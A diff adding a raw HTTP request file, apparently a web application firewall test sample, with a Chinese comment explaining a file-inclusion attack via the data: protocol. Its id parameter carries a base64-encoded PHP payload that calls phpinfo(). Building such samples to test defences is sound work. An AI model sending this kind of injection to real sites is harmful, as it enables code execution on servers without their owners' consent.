@@ -1,0 +1,9 @@
+# 文件包含_文件协议_data协议(Base64编码)
+# 攻击者通过使用data协议实现文件包含执行代码，将需要执行的代码进行base64编码
+GET /?id=data:text%2Fplain%EF%BC%9Bbase64%2CPD9waHAgcGhwaW5mbygpOz8+&bid=hd_tag_m8mv24ns HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24ns
+RM-PRO-Token: 7cbf3bbc446d97d0889a04b29e98aece
+RM-PRO-Time: 1742808396092
+User-Agent: curl/7.83.1
+
